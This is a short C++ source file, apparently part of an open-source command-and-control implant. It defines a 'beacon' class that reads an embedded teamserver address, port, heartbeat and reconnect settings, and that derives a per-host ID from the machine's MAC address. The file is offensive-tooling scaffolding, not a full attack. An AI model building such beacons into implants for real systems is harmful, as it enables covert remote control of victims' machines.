/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "beacon.h"
#include "../common/beacon_config.h"
#include "../base/crypto/crypto.h"

#ifdef _WIN32
#include "../base/win/winutil.h"
#else
#include "../base/inx/inxutil.h"
#endif

CONNECT_INFO connect_config = { CONFIG_FLAG };

std::string beacon::get_group()
{
	return connect_config.group;
}

std::string beacon::get_beacon_id()
{
	std::string mac;

#ifdef _WIN32
	win::get_mac(mac);
#else
	inx::get_mac(mac);
#endif

	static std::string beacon_id;
	if (beacon_id.empty())
	{
		char temp[256] = { 0 };
		snprintf(temp, sizeof(temp), "%s_%d", mac.c_str(), get_conn_type());
		beacon_id = get_group() + "_" + md5_string(temp);
	}

	return beacon_id;
}

std::string beacon::get_teamserver_addr()
{
	return connect_config.teamserver;
}

int beacon::get_teamserver_port()
{
	return connect_config.teamserver_port;
}

int beacon::get_conn_type()
{
	return connect_config.netio_type;
}

int beacon::get_heat_beat_time()
{
	if (!connect_config.heat_beat_interval)
		return 10;

	return connect_config.heat_beat_interval;
}

int beacon::get_reconnect_time()
{
	return connect_config.try_connect_interval;
}
